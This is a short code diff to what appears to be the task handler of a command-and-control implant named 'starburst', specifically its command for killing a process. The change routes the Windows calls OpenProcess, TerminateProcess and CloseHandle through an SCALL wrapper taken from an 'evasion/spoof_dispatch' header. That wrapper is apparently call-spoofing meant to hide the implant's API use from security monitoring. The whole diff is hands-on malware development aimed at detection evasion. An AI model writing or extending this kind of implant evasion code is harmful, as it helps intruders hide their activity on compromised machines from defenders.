@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_KILL
 
@@ -22,15 +23,15 @@ auto declfn starburst::cmd_kill(
         return;
     }
 
-    HANDLE h_proc = inst.kernel32.OpenProcess( PROCESS_TERMINATE, FALSE, pid );
+    HANDLE h_proc = (HANDLE)SCALL( inst, kernel32.OpenProcess, PROCESS_TERMINATE, FALSE, pid );
     if ( !h_proc ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "OpenProcess failed" ) ) );
         return;
     }
 
-    BOOL ok = inst.kernel32.TerminateProcess( h_proc, 1 );
-    inst.kernel32.CloseHandle( h_proc );
+    BOOL ok = (BOOL)SCALL( inst, kernel32.TerminateProcess, h_proc, 1 );
+    SCALL( inst, kernel32.CloseHandle, h_proc );
 
     if ( ok ) {
         char msg[64] = { 0 };
